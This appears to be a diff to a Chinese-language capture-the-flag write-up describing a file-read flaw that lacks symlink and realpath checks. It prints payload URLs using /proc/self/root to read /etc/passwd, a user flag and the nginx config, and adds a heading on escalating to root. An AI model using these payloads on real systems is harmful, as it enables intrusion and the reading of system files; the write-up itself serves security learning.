@@ -79,7 +79,7 @@ if ($action === 'read') {
 }
 ```
 利用action=list找到目标进程，利用/proc/pid/cmdline发现服务件，同时发现没有检查符号连接真实路径和realpath（）
-利用/?file=/proc/self/root/etc/passwd获取passwd
+利用/?file=/proc/self/root/etc/passwd获取passwd发现用户514
 ```
 root:x:0:0:root:/root:/bin/sh
 bin:x:1:1:bin:/bin:/sbin/nologin
@@ -104,6 +104,8 @@ nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
 ```
 利用root文件绕过查找到用户flag
 ?file=/proc/self/root/home/514/user.txt
+
+## 尝试提权到root用户
 /?file=/proc/self/root/etc/nginx/http.d/default.conf 
 找到nginx的目录/var/www/localhost
 ```
